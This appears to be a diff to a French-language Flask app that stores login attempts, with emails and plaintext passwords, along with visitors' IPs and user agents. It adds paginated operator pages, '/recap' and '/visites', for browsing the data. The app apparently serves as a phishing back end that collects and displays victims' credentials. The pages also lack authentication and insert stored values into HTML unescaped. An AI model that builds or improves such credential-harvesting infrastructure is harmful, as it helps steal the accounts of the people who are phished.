@@ -30,7 +30,6 @@ def init_db():
                     user_agent TEXT
                 )
             """)
-            # Ajout des colonnes si elles n'existent pas
             c.execute("ALTER TABLE logins ADD COLUMN IF NOT EXISTS user_id TEXT")
             c.execute("ALTER TABLE visits ADD COLUMN IF NOT EXISTS user_id TEXT")
         conn.commit()
@@ -95,28 +94,56 @@ def step2():
 
 @app.route("/recap", methods=["GET"])
 def recap():
+    page = int(request.args.get("page", 1))
+    per_page = 20
+    offset = (page - 1) * per_page
+
     with get_db() as conn:
         with conn.cursor() as c:
-            c.execute("SELECT timestamp, email, password, user_id FROM logins ORDER BY id DESC")
+            c.execute("SELECT COUNT(*) FROM logins")
+            total = c.fetchone()["count"]
+
+            c.execute("SELECT timestamp, email, password, user_id FROM logins ORDER BY id DESC LIMIT %s OFFSET %s", (per_page, offset))
             rows = c.fetchall()
 
     html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th><th>PC</th></tr>"
     for row in rows:
         html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td><td>{row['user_id']}</td></tr>"
-    html += "</table>"
+    html += "</table><br><div>Pages : "
+    total_pages = (total + per_page - 1) // per_page
+    for i in range(1, total_pages + 1):
+        if i == page:
+            html += f"<strong>{i}</strong> "
+        else:
+            html += f"<a href='/recap?page={i}'>{i}</a> "
+    html += "</div>"
     return html
 
 @app.route("/visites", methods=["GET"])
 def visites():
+    page = int(request.args.get("page", 1))
+    per_page = 20
+    offset = (page - 1) * per_page
+
     with get_db() as conn:
         with conn.cursor() as c:
-            c.execute("SELECT timestamp, ip, user_agent, user_id FROM visits ORDER BY id DESC LIMIT 50")
+            c.execute("SELECT COUNT(*) FROM visits")
+            total = c.fetchone()["count"]
+
+            c.execute("SELECT timestamp, ip, user_agent, user_id FROM visits ORDER BY id DESC LIMIT %s OFFSET %s", (per_page, offset))
             rows = c.fetchall()
 
     html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th><th>PC</th></tr>"
     for row in rows:
         html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td><td>{row['user_id']}</td></tr>"
-    html += "</table>"
+    html += "</table><br><div>Pages : "
+    total_pages = (total + per_page - 1) // per_page
+    for i in range(1, total_pages + 1):
+        if i == page:
+            html += f"<strong>{i}</strong> "
+        else:
+            html += f"<a href='/visites?page={i}'>{i}</a> "
+    html += "</div>"
     return html
 
 if __name__ == "__main__":
